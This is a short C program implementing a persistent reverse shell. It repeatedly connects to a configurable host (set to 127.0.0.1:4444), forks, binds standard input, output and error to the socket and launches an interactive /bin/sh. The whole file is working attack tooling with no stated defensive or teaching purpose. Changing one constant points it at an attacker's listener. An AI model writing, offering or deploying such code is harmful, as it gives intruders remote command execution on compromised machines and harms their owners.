#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#define RHOST  "127.0.0.1"
#define RPORT  4444
#define SHELL  "/bin/sh"
#define RETRY  5   /* seconds between reconnect attempts */

static int dial(const char *host, int port)
{
    int fd;
    struct sockaddr_in sa;

    fd = socket(AF_INET, SOCK_STREAM, 0);
    if (fd < 0)
        return -1;

    memset(&sa, 0, sizeof sa);
    sa.sin_family = AF_INET;
    sa.sin_port   = htons((uint16_t)port);

    if (inet_pton(AF_INET, host, &sa.sin_addr) != 1 ||
        connect(fd, (struct sockaddr *)&sa, sizeof sa) != 0) {
        close(fd);
        return -1;
    }

    return fd;
}

static void exec_shell(int fd)
{
    dup2(fd, STDIN_FILENO);
    dup2(fd, STDOUT_FILENO);
    dup2(fd, STDERR_FILENO);
    close(fd);
    execl(SHELL, SHELL, "-i", (char *)NULL);
}

int main(void)
{
    int   fd;
    pid_t pid;

    /* reap children automatically; parent loop never waits */
    signal(SIGCHLD, SIG_IGN);

    for (;;) {
        fd = dial(RHOST, RPORT);
        if (fd < 0) {
            sleep(RETRY);
            continue;
        }

        pid = fork();
        if (pid < 0) {
            close(fd);
            sleep(RETRY);
            continue;
        }

        if (pid == 0) {
            /* child: hand stdio to the socket and exec the shell */
            exec_shell(fd);
            _exit(1);
        }

        /* parent: close its copy and loop back for the next session */
        close(fd);
        sleep(RETRY);
    }

    return 0;
}
